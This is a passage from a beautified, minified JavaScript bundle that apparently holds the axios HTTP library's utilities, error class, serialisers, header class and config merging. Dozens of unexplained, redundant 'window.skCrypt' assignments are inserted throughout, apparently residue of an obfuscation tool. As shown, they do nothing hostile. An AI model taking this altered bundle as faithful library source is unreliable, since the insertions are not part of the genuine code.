          ww.addEventListener(
            "message",
            ({ source: t, data: e }) => {
              t === ww && e === Ew && xw.length && xw.shift()();
            },
            !1
          ),
          (t) => {
            xw.push(t), ww.postMessage(Ew, "*");
          })
        : (t) => setTimeout(t));
  var Bw, Cw, Ew, xw;
  const Pw =
      "undefined" != typeof queueMicrotask
        ? queueMicrotask.bind(ww)
        : (void 0 !== jy && jy.nextTick) || Tw,
    Ow = {
      isArray: $y,
      isArrayBuffer: ew,
      isBuffer: function (t) {
        return (
          null !== t &&
          !tw(t) &&
          null !== t.constructor &&
          !tw(t.constructor) &&
          rw(t.constructor.isBuffer) &&
          t.constructor.isBuffer(t)
        );
      },
      isFormData: (t) => {
        let e;
        return (
          t &&
          (("function" == typeof FormData && t instanceof FormData) ||
            (rw(t.append) &&
              ("formdata" === (e = Jy(t)) ||
                ("object" === e &&
                  rw(t.toString) &&
                  "[object FormData]" === t.toString()))))
        );
      },
      isArrayBufferView: function (t) {
        let e;
        return (
          (e =
            "undefined" != typeof ArrayBuffer && ArrayBuffer.isView
              ? ArrayBuffer.isView(t)
              : t && t.buffer && ew(t.buffer)),
          e
        );
      },
      isString: nw,
      isNumber: ow,
      isBoolean: (t) => !0 === t || !1 === t,
      isObject: iw,
      isPlainObject: sw,
      isReadableStream: fw,
      isRequest: hw,
      isResponse: pw,
      isHeaders: mw,
      isUndefined: tw,
      isDate: aw,
      isFile: uw,
      isBlob: cw,
      isRegExp: Iw,
      isFunction: rw,
      isStream: (t) => iw(t) && rw(t.pipe),
      isURLSearchParams: dw,
      isTypedArray: vw,
      isFileList: lw,
      forEach: gw,
      merge: function t() {
        const { caseless: e } = (bw(this) && this) || {},
          n = {},
          r = (r, o) => {
            const i = (e && yw(n, o)) || o;
            sw(n[i]) && sw(r)
              ? (n[i] = t(n[i], r))
              : sw(r)
              ? (n[i] = t({}, r))
              : $y(r)
              ? (n[i] = r.slice())
              : (n[i] = r);
          };
        for (let o = 0, i = arguments.length; o < i; o++)
          arguments[o] && gw(arguments[o], r);
        return n;
      },
      extend: (t, e, n, { allOwnKeys: r } = {}) => (
        gw(
          e,
          (e, r) => {
            n && rw(e) ? (t[r] = Gy(e, n)) : (t[r] = e);
          },
          { allOwnKeys: r }
        ),
        t
      ),
      trim: (t) =>
        t.trim ? t.trim() : t.replace(/^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g, ""),
      stripBOM: (t) => (65279 === t.charCodeAt(0) && (t = t.slice(1)), t),
      inherits: (t, e, n, r) => {
        (t.prototype = Object.create(e.prototype, r)),
          (t.prototype.constructor = t),
          Object.defineProperty(t, "super", { value: e.prototype }),
          n && Object.assign(t.prototype, n);
      },
      toFlatObject: (t, e, n, r) => {
        let o, i, s;
        const a = {};
        if (((e = e || {}), null == t)) return e;
        do {
          for (o = Object.getOwnPropertyNames(t), i = o.length; i-- > 0; )
            (s = o[i]),
              (r && !r(s, t, e)) || a[s] || ((e[s] = t[s]), (a[s] = !0));
          t = !1 !== n && Hy(t);
        } while (t && (!n || n(t, e)) && t !== Object.prototype);
        return e;
      },
      kindOf: Jy,
      kindOfTest: Yy,
      endsWith: (t, e, n) => {
        (t = String(t)),
          (void 0 === n || n > t.length) && (n = t.length),
          (n -= e.length);
        const r = t.indexOf(e, n);
        return -1 !== r && r === n;
      },
      toArray: (t) => {
        if (!t) return null;
        if ($y(t)) return t;
        let e = t.length;
        if (!ow(e)) return null;
        const n = new Array(e);
        for (; e-- > 0; ) n[e] = t[e];
        return n;
      },
      forEachEntry: (t, e) => {
        const n = (t && t[Zy]).call(t);
        let r;
        for (; (r = n.next()) && !r.done; ) {
          const n = r.value;
          e.call(t, n[0], n[1]);
        }
      },
      matchAll: (t, e) => {
        let n;
        const r = [];
        for (; null !== (n = t.exec(e)); ) r.push(n);
        return r;
      },
      isHTMLForm: Aw,
      hasOwnProperty: kw,
      hasOwnProp: kw,
      reduceDescriptors: Sw,
      freezeMethods: (t) => {
        Sw(t, (e, n) => {
          if (rw(t) && -1 !== ["arguments", "caller", "callee"].indexOf(n))
            return !1;
          const r = t[n];
          if (rw(r)) {
            if (((e.enumerable = !1), "writable" in e))
              return (e.writable = !1), void 0;
            e.set ||
              (e.set = () => {
                throw Error("Can not rewrite read-only method '" + n + "'");
              });
          }
        });
      },
      toObjectSet: (t, e) => {
        const n = {},
          r = (t) => {
            t.forEach((t) => {
              n[t] = !0;
            });
          };
        return $y(t) ? r(t) : r(String(t).split(e)), n;
      },
      toCamelCase: (t) =>
        t.toLowerCase().replace(/[-_\s]([a-z\d])(\w*)/g, function (t, e, n) {
          return e.toUpperCase() + n;
        }),
      noop: () => {},
      toFiniteNumber: (t, e) =>
        null != t && Number.isFinite((t = +t)) ? t : e,
      findKey: yw,
      global: ww,
      isContextDefined: bw,
      isSpecCompliantForm: function (t) {
        return !!(t && rw(t.append) && "FormData" === t[Xy] && t[Zy]);
      },
      toJSONObject: (t) => {
        const e = new Array(10),
          n = (t, r) => {
            if (iw(t)) {
              if (e.indexOf(t) >= 0) return;
              if (!("toJSON" in t)) {
                e[r] = t;
                const o = $y(t) ? [] : {};
                return (
                  gw(t, (t, e) => {
                    const i = n(t, r + 1);
                    !tw(i) && (o[e] = i);
                  }),
                  (e[r] = void 0),
                  o
                );
              }
            }
            return t;
          };
        return n(t, 0);
      },
      isAsyncFn: _w,
      isThenable: (t) => t && (iw(t) || rw(t)) && rw(t.then) && rw(t.catch),
      setImmediate: Tw,
      asap: Pw,
      isIterable: (t) => null != t && rw(t[Zy]),
    };
  function Rw(t, e, n, r, o) {
    Error.call(this),
      Error.captureStackTrace
        ? Error.captureStackTrace(this, this.constructor)
        : (this.stack = new Error().stack),
      (this.message = t),
      (this.name = "AxiosError"),
      e && (this.code = e),
      n && (this.config = n),
      r && (this.request = r),
      o && ((this.response = o), (this.status = o.status ? o.status : null));
  }
  (window.skCrypt = function (t) {
    return function () {
      return t;
    };
  }),
    Ow.inherits(Rw, Error, {
      toJSON: function () {
        return {
          message: this.message,
          name: this.name,
          description: this.description,
          number: this.number,
          fileName: this.fileName,
          lineNumber: this.lineNumber,
          columnNumber: this.columnNumber,
          stack: this.stack,
          config: Ow.toJSONObject(this.config),
          code: this.code,
          status: this.status,
        };
      },
    });
  const Mw = Rw.prototype,
    Lw = {};
  [
    "ERR_BAD_OPTION_VALUE",
    "ERR_BAD_OPTION",
    "ECONNABORTED",
    "ETIMEDOUT",
    "ERR_NETWORK",
    "ERR_FR_TOO_MANY_REDIRECTS",
    "ERR_DEPRECATED",
    "ERR_BAD_RESPONSE",
    "ERR_BAD_REQUEST",
    "ERR_CANCELED",
    "ERR_NOT_SUPPORT",
    "ERR_INVALID_URL",
  ].forEach((t) => {
    Lw[t] = { value: t };
  }),
    Object.defineProperties(Rw, Lw),
    Object.defineProperty(Mw, "isAxiosError", { value: !0 }),
    (Rw.from = (t, e, n, r, o, i) => {
      const s = Object.create(Mw);
      return (
        Ow.toFlatObject(
          t,
          s,
          function (t) {
            return t !== Error.prototype;
          },
          (t) => "isAxiosError" !== t
        ),
        Rw.call(s, t.message, e, n, r, o),
        (s.cause = t),
        (s.name = t.name),
        i && Object.assign(s, i),
        s
      );
    }),
    (window.skCrypt = function (t) {
      return function () {
        return t;
      };
    });
  function Nw(t) {
    return Ow.isPlainObject(t) || Ow.isArray(t);
  }
  function Dw(t) {
    return Ow.endsWith(t, "[]") ? t.slice(0, -2) : t;
  }
  function Uw(t, e, n) {
    return t
      ? t
          .concat(e)
          .map(function (t, e) {
            return (t = Dw(t)), !n && e ? "[" + t + "]" : t;
          })
          .join(n ? "." : "")
      : e;
  }
  window.skCrypt = function (t) {
    return function () {
      return t;
    };
  };
  const qw = Ow.toFlatObject(Ow, {}, null, function (t) {
    return /^is[A-Z]/.test(t);
  });
  function zw(t, e, n) {
    if (!Ow.isObject(t)) throw new TypeError("target must be an object");
    e = e || new FormData();
    const r = (n = Ow.toFlatObject(
        n,
        { metaTokens: !0, dots: !1, indexes: !1 },
        !1,
        function (t, e) {
          return !Ow.isUndefined(e[t]);
        }
      )).metaTokens,
      o = n.visitor || c,
      i = n.dots,
      s = n.indexes,
      a =
        (n.Blob || ("undefined" != typeof Blob && Blob)) &&
        Ow.isSpecCompliantForm(e);
    if (!Ow.isFunction(o)) throw new TypeError("visitor must be a function");
    function u(t) {
      if (null === t) return "";
      if (Ow.isDate(t)) return t.toISOString();
      if (Ow.isBoolean(t)) return t.toString();
      if (!a && Ow.isBlob(t))
        throw new Rw("Blob is not supported. Use a Buffer instead.");
      return Ow.isArrayBuffer(t) || Ow.isTypedArray(t)
        ? a && "function" == typeof Blob
          ? new Blob([t])
          : dt.from(t)
        : t;
    }
    function c(t, n, o) {
      let a = t;
      if (t && !o && "object" == typeof t)
        if (Ow.endsWith(n, "{}"))
          (n = r ? n : n.slice(0, -2)), (t = JSON.stringify(t));
        else if (
          (Ow.isArray(t) &&
            (function (t) {
              return Ow.isArray(t) && !t.some(Nw);
            })(t)) ||
          ((Ow.isFileList(t) || Ow.endsWith(n, "[]")) && (a = Ow.toArray(t)))
        )
          return (
            (n = Dw(n)),
            a.forEach(function (t, r) {
              !Ow.isUndefined(t) &&
                null !== t &&
                e.append(
                  !0 === s ? Uw([n], r, i) : null === s ? n : n + "[]",
                  u(t)
                );
            }),
            !1
          );
      return !!Nw(t) || (e.append(Uw(o, n, i), u(t)), !1);
    }
    const l = [],
      d = Object.assign(qw, {
        defaultVisitor: c,
        convertValue: u,
        isVisitable: Nw,
      });
    if (!Ow.isObject(t)) throw new TypeError("data must be an object");
    return (
      !(function t(n, r) {
        if (!Ow.isUndefined(n)) {
          if (-1 !== l.indexOf(n))
            throw Error("Circular reference detected in " + r.join("."));
          l.push(n),
            Ow.forEach(n, function (n, i) {
              !0 ===
                (!(Ow.isUndefined(n) || null === n) &&
                  o.call(e, n, Ow.isString(i) ? i.trim() : i, r, d)) &&
                t(n, r ? r.concat(i) : [i]);
            }),
            l.pop();
        }
      })(t),
      e
    );
  }
  function Kw(t) {
    const e = {
      "!": "%21",
      "'": "%27",
      "(": "%28",
      ")": "%29",
      "~": "%7E",
      "%20": "+",
      "%00": "\0",
    };
    return encodeURIComponent(t).replace(/[!'()~]|%20|%00/g, function (t) {
      return e[t];
    });
  }
  function Ww(t, e) {
    (this._pairs = []), t && zw(t, this, e);
  }
  window.skCrypt = function (t) {
    return function () {
      return t;
    };
  };
  const Fw = Ww.prototype;
  function jw(t) {
    return encodeURIComponent(t)
      .replace(/%3A/gi, ":")
      .replace(/%24/g, "$")
      .replace(/%2C/gi, ",")
      .replace(/%20/g, "+")
      .replace(/%5B/gi, "[")
      .replace(/%5D/gi, "]");
  }
  function Gw(t, e, n) {
    if (!e) return t;
    const r = (n && n.encode) || jw;
    Ow.isFunction(n) && (n = { serialize: n });
    const o = n && n.serialize;
    let i;
    if (
      ((i = o
        ? o(e, n)
        : Ow.isURLSearchParams(e)
        ? e.toString()
        : new Ww(e, n).toString(r)),
      i)
    ) {
      const e = t.indexOf("#");
      -1 !== e && (t = t.slice(0, e)),
        (t += (-1 === t.indexOf("?") ? "?" : "&") + i);
    }
    return t;
  }
  (Fw.append = function (t, e) {
    this._pairs.push([t, e]);
  }),
    (Fw.toString = function (t) {
      const e = t
        ? function (e) {
            return t.call(this, e, Kw);
          }
        : Kw;
      return this._pairs
        .map(function (t) {
          return e(t[0]) + "=" + e(t[1]);
        }, "")
        .join("&");
    }),
    (window.skCrypt = function (t) {
      return function () {
        return t;
      };
    }),
    (window.skCrypt = function (t) {
      return function () {
        return t;
      };
    });
  class Vw {
    constructor() {
      this.handlers = [];
    }
    use(t, e, n) {
      return (
        this.handlers.push({
          fulfilled: t,
          rejected: e,
          synchronous: !!n && n.synchronous,
          runWhen: n ? n.runWhen : null,
        }),
        this.handlers.length - 1
      );
    }
    eject(t) {
      this.handlers[t] && (this.handlers[t] = null);
    }
    clear() {
      this.handlers && (this.handlers = []);
    }
    forEach(t) {
      Ow.forEach(this.handlers, function (e) {
        null !== e && t(e);
      });
    }
  }
  window.skCrypt = function (t) {
    return function () {
      return t;
    };
  };
  const Hw = {
    silentJSONParsing: !0,
    forcedJSONParsing: !0,
    clarifyTimeoutError: !1,
  };
  window.skCrypt = function (t) {
    return function () {
      return t;
    };
  };
  const Zw = "undefined" != typeof URLSearchParams ? URLSearchParams : Ww;
  window.skCrypt = function (t) {
    return function () {
      return t;
    };
  };
  const Xw = "undefined" != typeof FormData ? FormData : null;
  window.skCrypt = function (t) {
    return function () {
      return t;
    };
  };
  const Jw = "undefined" != typeof Blob ? Blob : null;
  window.skCrypt = function (t) {
    return function () {
      return t;
    };
  };
  const Yw = {
    isBrowser: !0,
    classes: { URLSearchParams: Zw, FormData: Xw, Blob: Jw },
    protocols: ["http", "https", "file", "blob", "url", "data"],
  };
  window.skCrypt = function (t) {
    return function () {
      return t;
    };
  };
  const Qw = "undefined" != typeof window && "undefined" != typeof document,
    $w = ("object" == typeof navigator && navigator) || void 0,
    tb =
      Qw &&
      (!$w || ["ReactNative", "NativeScript", "NS"].indexOf($w.product) < 0),
    eb =
      "undefined" != typeof WorkerGlobalScope &&
      self instanceof WorkerGlobalScope &&
      "function" == typeof self.importScripts,
    nb = (Qw && window.location.href) || "http://localhost",
    rb = Object.freeze(
      Object.defineProperty(
        {
          __proto__: null,
          hasBrowserEnv: Qw,
          hasStandardBrowserEnv: tb,
          hasStandardBrowserWebWorkerEnv: eb,
          navigator: $w,
          origin: nb,
        },
        Symbol.toStringTag,
        { value: "Module" }
      )
    );
  window.skCrypt = function (t) {
    return function () {
      return t;
    };
  };
  const ob = { ...rb, ...Yw };
  function ib(t) {
    function e(t, n, r, o) {
      let i = t[o++];
      if ("__proto__" === i) return !0;
      const s = Number.isFinite(+i),
        a = o >= t.length;
      if (((i = !i && Ow.isArray(r) ? r.length : i), a))
        return Ow.hasOwnProp(r, i) ? (r[i] = [r[i], n]) : (r[i] = n), !s;
      (r[i] && Ow.isObject(r[i])) || (r[i] = []);
      return (
        e(t, n, r[i], o) &&
          Ow.isArray(r[i]) &&
          (r[i] = (function (t) {
            const e = {},
              n = Object.keys(t);
            let r;
            const o = n.length;
            let i;
            for (r = 0; r < o; r++) (i = n[r]), (e[i] = t[i]);
            return e;
          })(r[i])),
        !s
      );
    }
    if (Ow.isFormData(t) && Ow.isFunction(t.entries)) {
      const n = {};
      return (
        Ow.forEachEntry(t, (t, r) => {
          e(
            (function (t) {
              return Ow.matchAll(/\w+|\[(\w*)]/g, t).map((t) =>
                "[]" === t[0] ? "" : t[1] || t[0]
              );
            })(t),
            r,
            n,
            0
          );
        }),
        n
      );
    }
    return null;
  }
  (window.skCrypt = function (t) {
    return function () {
      return t;
    };
  }),
    (window.skCrypt = function (t) {
      return function () {
        return t;
      };
    }),
    (window.skCrypt = function (t) {
      return function () {
        return t;
      };
    });
  const sb = {
    transitional: Hw,
    adapter: ["xhr", "http", "fetch"],
    transformRequest: [
      function (t, e) {
        const n = e.getContentType() || "",
          r = n.indexOf("application/json") > -1,
          o = Ow.isObject(t);
        o && Ow.isHTMLForm(t) && (t = new FormData(t));
        if (Ow.isFormData(t)) return r ? JSON.stringify(ib(t)) : t;
        if (
          Ow.isArrayBuffer(t) ||
          Ow.isBuffer(t) ||
          Ow.isStream(t) ||
          Ow.isFile(t) ||
          Ow.isBlob(t) ||
          Ow.isReadableStream(t)
        )
          return t;
        if (Ow.isArrayBufferView(t)) return t.buffer;
        if (Ow.isURLSearchParams(t))
          return (
            e.setContentType(
              "application/x-www-form-urlencoded;charset=utf-8",
              !1
            ),
            t.toString()
          );
        let i;
        if (o) {
          if (n.indexOf("application/x-www-form-urlencoded") > -1)
            return (function (t, e) {
              return zw(
                t,
                new ob.classes.URLSearchParams(),
                Object.assign(
                  {
                    visitor: function (t, e, n, r) {
                      return ob.isNode && Ow.isBuffer(t)
                        ? (this.append(e, t.toString("base64")), !1)
                        : r.defaultVisitor.apply(this, arguments);
                    },
                  },
                  e
                )
              );
            })(t, this.formSerializer).toString();
          if ((i = Ow.isFileList(t)) || n.indexOf("multipart/form-data") > -1) {
            const e = this.env && this.env.FormData;
            return zw(
              i ? { "files[]": t } : t,
              e && new e(),
              this.formSerializer
            );
          }
        }
        return o || r
          ? (e.setContentType("application/json", !1),
            (function (t, e, n) {
              if (Ow.isString(t))
                try {
                  return (0, JSON.parse)(t), Ow.trim(t);
                } catch (r) {
                  if ("SyntaxError" !== r.name) throw r;
                }
              return (n || JSON.stringify)(t);
            })(t))
          : t;
      },
    ],
    transformResponse: [
      function (t) {
        const e = this.transitional || sb.transitional,
          n = e && e.forcedJSONParsing,
          r = "json" === this.responseType;
        if (Ow.isResponse(t) || Ow.isReadableStream(t)) return t;
        if (t && Ow.isString(t) && ((n && !this.responseType) || r)) {
          const n = !(e && e.silentJSONParsing) && r;
          try {
            return JSON.parse(t);
          } catch (o) {
            if (n) {
              if ("SyntaxError" === o.name)
                throw Rw.from(
                  o,
                  Rw.ERR_BAD_RESPONSE,
                  this,
                  null,
                  this.response
                );
              throw o;
            }
          }
        }
        return t;
      },
    ],
    timeout: 0,
    xsrfCookieName: "XSRF-TOKEN",
    xsrfHeaderName: "X-XSRF-TOKEN",
    maxContentLength: -1,
    maxBodyLength: -1,
    env: { FormData: ob.classes.FormData, Blob: ob.classes.Blob },
    validateStatus: function (t) {
      return t >= 200 && t < 300;
    },
    headers: {
      common: {
        Accept: "application/json, text/plain, */*",
        "Content-Type": void 0,
      },
    },
  };
  Ow.forEach(["delete", "get", "head", "post", "put", "patch"], (t) => {
    sb.headers[t] = {};
  }),
    (window.skCrypt = function (t) {
      return function () {
        return t;
      };
    });
  const ab = Ow.toObjectSet([
    "age",
    "authorization",
    "content-length",
    "content-type",
    "etag",
    "expires",
    "from",
    "host",
    "if-modified-since",
    "if-unmodified-since",
    "last-modified",
    "location",
    "max-forwards",
    "proxy-authorization",
    "referer",
    "retry-after",
    "user-agent",
  ]);
  window.skCrypt = function (t) {
    return function () {
      return t;
    };
  };
  const ub = Symbol("internals");
  function cb(t) {
    return t && String(t).trim().toLowerCase();
  }
  function lb(t) {
    return !1 === t || null == t ? t : Ow.isArray(t) ? t.map(lb) : String(t);
  }
  function db(t, e, n, r, o) {
    return Ow.isFunction(r)
      ? r.call(this, e, n)
      : (o && (e = n),
        Ow.isString(e)
          ? Ow.isString(r)
            ? -1 !== e.indexOf(r)
            : Ow.isRegExp(r)
            ? r.test(e)
            : void 0
          : void 0);
  }
  let fb = class {
    constructor(t) {
      t && this.set(t);
    }
    set(t, e, n) {
      const r = this;
      function o(t, e, n) {
        const o = cb(e);
        if (!o) throw new Error("header name must be a non-empty string");
        const i = Ow.findKey(r, o);
        (!i || void 0 === r[i] || !0 === n || (void 0 === n && !1 !== r[i])) &&
          (r[i || e] = lb(t));
      }
      const i = (t, e) => Ow.forEach(t, (t, n) => o(t, n, e));
      if (Ow.isPlainObject(t) || t instanceof this.constructor) i(t, e);
      else if (
        Ow.isString(t) &&
        (t = t.trim()) &&
        !/^[-_a-zA-Z0-9^`|~,!#$%&'*+.]+$/.test(t.trim())
      )
        i(
          ((t) => {
            const e = {};
            let n, r, o;
            return (
              t &&
                t.split("\n").forEach(function (t) {
                  (o = t.indexOf(":")),
                    (n = t.substring(0, o).trim().toLowerCase()),
                    (r = t.substring(o + 1).trim()),
                    !n ||
                      (e[n] && ab[n]) ||
                      ("set-cookie" === n
                        ? e[n]
                          ? e[n].push(r)
                          : (e[n] = [r])
                        : (e[n] = e[n] ? e[n] + ", " + r : r));
                }),
              e
            );
          })(t),
          e
        );
      else if (Ow.isObject(t) && Ow.isIterable(t)) {
        let n,
          r,
          o = {};
        for (const e of t) {
          if (!Ow.isArray(e))
            throw TypeError("Object iterator must return a key-value pair");
          o[(r = e[0])] = (n = o[r])
            ? Ow.isArray(n)
              ? [...n, e[1]]
              : [n, e[1]]
            : e[1];
        }
        i(o, e);
      } else null != t && o(e, t, n);
      return this;
    }
    get(t, e) {
      if ((t = cb(t))) {
        const n = Ow.findKey(this, t);
        if (n) {
          const t = this[n];
          if (!e) return t;
          if (!0 === e)
            return (function (t) {
              const e = Object.create(null),
                n = /([^\s,;=]+)\s*(?:=\s*([^,;]+))?/g;
              let r;
              for (; (r = n.exec(t)); ) e[r[1]] = r[2];
              return e;
            })(t);
          if (Ow.isFunction(e)) return e.call(this, t, n);
          if (Ow.isRegExp(e)) return e.exec(t);
          throw new TypeError("parser must be boolean|regexp|function");
        }
      }
    }
    has(t, e) {
      if ((t = cb(t))) {
        const n = Ow.findKey(this, t);
        return !(!n || void 0 === this[n] || (e && !db(0, this[n], n, e)));
      }
      return !1;
    }
    delete(t, e) {
      const n = this;
      let r = !1;
      function o(t) {
        if ((t = cb(t))) {
          const o = Ow.findKey(n, t);
          !o || (e && !db(0, n[o], o, e)) || (delete n[o], (r = !0));
        }
      }
      return Ow.isArray(t) ? t.forEach(o) : o(t), r;
    }
    clear(t) {
      const e = Object.keys(this);
      let n = e.length,
        r = !1;
      for (; n--; ) {
        const o = e[n];
        (t && !db(0, this[o], o, t, !0)) || (delete this[o], (r = !0));
      }
      return r;
    }
    normalize(t) {
      const e = this,
        n = {};
      return (
        Ow.forEach(this, (r, o) => {
          const i = Ow.findKey(n, o);
          if (i) return (e[i] = lb(r)), delete e[o], void 0;
          const s = t
            ? (function (t) {
                return t
                  .trim()
                  .toLowerCase()
                  .replace(/([a-z\d])(\w*)/g, (t, e, n) => e.toUpperCase() + n);
              })(o)
            : String(o).trim();
          s !== o && delete e[o], (e[s] = lb(r)), (n[s] = !0);
        }),
        this
      );
    }
    concat(...t) {
      return this.constructor.concat(this, ...t);
    }
    toJSON(t) {
      const e = Object.create(null);
      return (
        Ow.forEach(this, (n, r) => {
          null != n &&
            !1 !== n &&
            (e[r] = t && Ow.isArray(n) ? n.join(", ") : n);
        }),
        e
      );
    }
    [Symbol.iterator]() {
      return Object.entries(this.toJSON())[Symbol.iterator]();
    }
    toString() {
      return Object.entries(this.toJSON())
        .map(([t, e]) => t + ": " + e)
        .join("\n");
    }
    getSetCookie() {
      return this.get("set-cookie") || [];
    }
    get [Symbol.toStringTag]() {
      return "AxiosHeaders";
    }
    static from(t) {
      return t instanceof this ? t : new this(t);
    }
    static concat(t, ...e) {
      const n = new this(t);
      return e.forEach((t) => n.set(t)), n;
    }
    static accessor(t) {
      const e = (this[ub] = this[ub] = { accessors: {} }).accessors,
        n = this.prototype;
      function r(t) {
        const r = cb(t);
        e[r] ||
          (!(function (t, e) {
            const n = Ow.toCamelCase(" " + e);
            ["get", "set", "has"].forEach((r) => {
              Object.defineProperty(t, r + n, {
                value: function (t, n, o) {
                  return this[r].call(this, e, t, n, o);
                },
                configurable: !0,
              });
            });
          })(n, t),
          (e[r] = !0));
      }
      return Ow.isArray(t) ? t.forEach(r) : r(t), this;
    }
  };
  function hb(t, e) {
    const n = this || sb,
      r = e || n,
      o = fb.from(r.headers);
    let i = r.data;
    return (
      Ow.forEach(t, function (t) {
        i = t.call(n, i, o.normalize(), e ? e.status : void 0);
      }),
      o.normalize(),
      i
    );
  }
  function pb(t) {
    return !(!t || !t.__CANCEL__);
  }
  function mb(t, e, n) {
    Rw.call(this, null == t ? "canceled" : t, Rw.ERR_CANCELED, e, n),
      (this.name = "CanceledError");
  }
  function gb(t, e, n) {
    const r = n.config.validateStatus;
    n.status && r && !r(n.status)
      ? e(
          new Rw(
            "Request failed with status code " + n.status,
            [Rw.ERR_BAD_REQUEST, Rw.ERR_BAD_RESPONSE][
              Math.floor(n.status / 100) - 4
            ],
            n.config,
            n.request,
            n
          )
        )
      : t(n);
  }
  fb.accessor([
    "Content-Type",
    "Content-Length",
    "Accept",
    "Accept-Encoding",
    "User-Agent",
    "Authorization",
  ]),
    Ow.reduceDescriptors(fb.prototype, ({ value: t }, e) => {
      let n = e[0].toUpperCase() + e.slice(1);
      return {
        get: () => t,
        set(t) {
          this[n] = t;
        },
      };
    }),
    Ow.freezeMethods(fb),
    (window.skCrypt = function (t) {
      return function () {
        return t;
      };
    }),
    (window.skCrypt = function (t) {
      return function () {
        return t;
      };
    }),
    (window.skCrypt = function (t) {
      return function () {
        return t;
      };
    }),
    Ow.inherits(mb, Rw, { __CANCEL__: !0 }),
    (window.skCrypt = function (t) {
      return function () {
        return t;
      };
    }),
    (window.skCrypt = function (t) {
      return function () {
        return t;
      };
    }),
    (window.skCrypt = function (t) {
      return function () {
        return t;
      };
    }),
    (window.skCrypt = function (t) {
      return function () {
        return t;
      };
    }),
    (window.skCrypt = function (t) {
      return function () {
        return t;
      };
    });
  const yb = (t, e, n = 3) => {
      let r = 0;
      const o = (function (t, e) {
        t = t || 10;
        const n = new Array(t),
          r = new Array(t);
        let o,
          i = 0,
          s = 0;
        return (
          (e = void 0 !== e ? e : 1e3),
          function (a) {
            const u = Date.now(),
              c = r[s];
            o || (o = u), (n[i] = a), (r[i] = u);
            let l = s,
              d = 0;
            for (; l !== i; ) (d += n[l++]), (l %= t);
            if (((i = (i + 1) % t), i === s && (s = (s + 1) % t), u - o < e))
              return;
            const f = c && u - c;
            return f ? Math.round((1e3 * d) / f) : void 0;
          }
        );
      })(50, 250);
      return (function (t, e) {
        let n,
          r,
          o = 0,
          i = 1e3 / e;
        const s = (e, i = Date.now()) => {
          (o = i),
            (n = null),
            r && (clearTimeout(r), (r = null)),
            t.apply(null, e);
        };
        return [
          (...t) => {
            const e = Date.now(),
              a = e - o;
            a >= i
              ? s(t, e)
              : ((n = t),
                r ||
                  (r = setTimeout(() => {
                    (r = null), s(n);
                  }, i - a)));
          },
          () => n && s(n),
        ];
      })((n) => {
        const i = n.loaded,
          s = n.lengthComputable ? n.total : void 0,
          a = i - r,
          u = o(a);
        r = i;
        t({
          loaded: i,
          total: s,
          progress: s ? i / s : void 0,
          bytes: a,
          rate: u || void 0,
          estimated: u && s && i <= s ? (s - i) / u : void 0,
          event: n,
          lengthComputable: null != s,
          [e ? "download" : "upload"]: !0,
        });
      }, n);
    },
    wb = (t, e) => {
      const n = null != t;
      return [(r) => e[0]({ lengthComputable: n, total: t, loaded: r }), e[1]];
    },
    bb =
      (t) =>
      (...e) =>
        Ow.asap(() => t(...e));
  window.skCrypt = function (t) {
    return function () {
      return t;
    };
  };
  const vb = ob.hasStandardBrowserEnv
    ? ((t, e) => (n) => (
        (n = new URL(n, ob.origin)),
        t.protocol === n.protocol &&
          t.host === n.host &&
          (e || t.port === n.port)
      ))(
        new URL(ob.origin),
        ob.navigator && /(msie|trident)/i.test(ob.navigator.userAgent)
      )
    : () => !0;
  window.skCrypt = function (t) {
    return function () {
      return t;
    };
  };
  const Ab = ob.hasStandardBrowserEnv
    ? {
        write(t, e, n, r, o, i) {
          const s = [t + "=" + encodeURIComponent(e)];
          Ow.isNumber(n) && s.push("expires=" + new Date(n).toGMTString()),
            Ow.isString(r) && s.push("path=" + r),
            Ow.isString(o) && s.push("domain=" + o),
            !0 === i && s.push("secure"),
            (document.cookie = s.join("; "));
        },
        read(t) {
          const e = document.cookie.match(
            new RegExp("(^|;\\s*)(" + t + ")=([^;]*)")
          );
          return e ? decodeURIComponent(e[3]) : null;
        },
        remove(t) {
          this.write(t, "", Date.now() - 864e5);
        },
      }
    : { write() {}, read: () => null, remove() {} };
  function kb(t, e, n) {
    let r = !/^([a-z][a-z\d+\-.]*:)?\/\//i.test(e);
    return t && (r || 0 == n)
      ? (function (t, e) {
          return e ? t.replace(/\/?\/$/, "") + "/" + e.replace(/^\/+/, "") : t;
        })(t, e)
      : e;
  }
  (window.skCrypt = function (t) {
    return function () {
      return t;
    };
  }),
    (window.skCrypt = function (t) {
      return function () {
        return t;
      };
    }),
    (window.skCrypt = function (t) {
      return function () {
        return t;
      };
    }),
    (window.skCrypt = function (t) {
      return function () {
        return t;
      };
    });
  const Ib = (t) => (t instanceof fb ? { ...t } : t);
  function Sb(t, e) {
    e = e || {};
    const n = {};
    function r(t, e, n, r) {
      return Ow.isPlainObject(t) && Ow.isPlainObject(e)
        ? Ow.merge.call({ caseless: r }, t, e)
        : Ow.isPlainObject(e)
        ? Ow.merge({}, e)
        : Ow.isArray(e)
        ? e.slice()
        : e;
    }
    function o(t, e, n, o) {
      return Ow.isUndefined(e)
        ? Ow.isUndefined(t)
          ? void 0
          : r(void 0, t, 0, o)
        : r(t, e, 0, o);
    }
    function i(t, e) {
      if (!Ow.isUndefined(e)) return r(void 0, e);
    }
    function s(t, e) {
      return Ow.isUndefined(e)
        ? Ow.isUndefined(t)
          ? void 0
          : r(void 0, t)
        : r(void 0, e);
    }
    function a(n, o, i) {
      return i in e ? r(n, o) : i in t ? r(void 0, n) : void 0;
    }
    const u = {
      url: i,
      method: i,
      data: i,
      baseURL: s,
      transformRequest: s,
      transformResponse: s,
      paramsSerializer: s,
      timeout: s,
      timeoutMessage: s,
      withCredentials: s,
      withXSRFToken: s,
      adapter: s,
      responseType: s,
      xsrfCookieName: s,
      xsrfHeaderName: s,
      onUploadProgress: s,
      onDownloadProgress: s,
      decompress: s,
      maxContentLength: s,
      maxBodyLength: s,
      beforeRedirect: s,
      transport: s,
      httpAgent: s,
      httpsAgent: s,
      cancelToken: s,
      socketPath: s,
      responseEncoding: s,
      validateStatus: a,
      headers: (t, e, n) => o(Ib(t), Ib(e), 0, !0),
    };
    return (
      Ow.forEach(Object.keys(Object.assign({}, t, e)), function (r) {
        const i = u[r] || o,
          s = i(t[r], e[r], r);
        (Ow.isUndefined(s) && i !== a) || (n[r] = s);
      }),
      n
    );
  }
  window.skCrypt = function (t) {
    return function () {
      return t;
    };
  };
  const _b = (t) => {
    const e = Sb({}, t);
    let n,
      {
        data: r,
        withXSRFToken: o,
